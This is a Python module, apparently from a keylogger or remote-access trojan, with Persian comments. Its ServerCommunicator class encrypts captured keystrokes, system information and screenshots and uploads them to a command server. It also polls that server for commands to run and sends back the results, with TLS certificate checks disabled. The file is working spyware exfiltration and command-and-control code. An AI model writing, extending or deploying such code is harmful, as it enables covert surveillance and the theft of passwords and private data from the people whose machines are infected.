# ------------ network/communicator.py ------------
import requests
import json
from config import Config
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class ServerCommunicator:
    def __init__(self, client_id, encryption_manager):
        self.client_id = client_id
        self.encryption = encryption_manager

    def _send_request(self, endpoint, data=None, files=None):
        try:
            response = requests.post(
                f"{Config.SERVER_URL}/{endpoint}",
                data=data,
                files=files,
                verify=False,  # برای محیط لوکال، بعداً SSL را فعال کنید
                timeout=Config.COMMAND_TIMEOUT
            )
            return self._handle_response(response)
        except requests.exceptions.RequestException as e:
            raise CommunicationError(f"Connection error: {str(e)}")

    def _handle_response(self, response):
        if response.status_code == 200:
            try:
                data = response.json()
                if not isinstance(data, dict) or 'commands' not in data:
                    raise CommunicationError("Invalid response format: 'commands' key missing")
                return data['commands']  # فقط لیست دستورات را برگردانید
            except json.JSONDecodeError:
                raise CommunicationError("Invalid JSON response")
        else:
            raise CommunicationError(f"Server error: {response.status_code}")

    def upload_data(self, keystrokes, system_info, screenshot=None):
        encrypted_data = {
            "keystrokes": self.encryption.encrypt(' '.join(keystrokes)),
            "system_info": self.encryption.encrypt(json.dumps(system_info))
        }
        
        return self._send_request(
            "upload",
            data={
                "client_id": self.client_id,
                "token": Config.SECRET_TOKEN,
                **encrypted_data
            },
            files={'screenshot': ('screen.png', screenshot, 'image/png')} if screenshot else None
        )

    def fetch_commands(self):
        response = self._send_request(
            "commands",
            data={
                "action": "get_commands",
                "client_id": self.client_id,
                "token": Config.SECRET_TOKEN
            }
        )
        if not isinstance(response, list):
            raise CommunicationError("Expected a list of commands")
        return response

    def send_command_result(self, command_id, result):
        return self._send_request(
            "command_response",
            data={
                "command_id": command_id,
                "result": self.encryption.encrypt(json.dumps(result)),
                "token": Config.SECRET_TOKEN
            }
        )

class CommunicationError(Exception):
    pass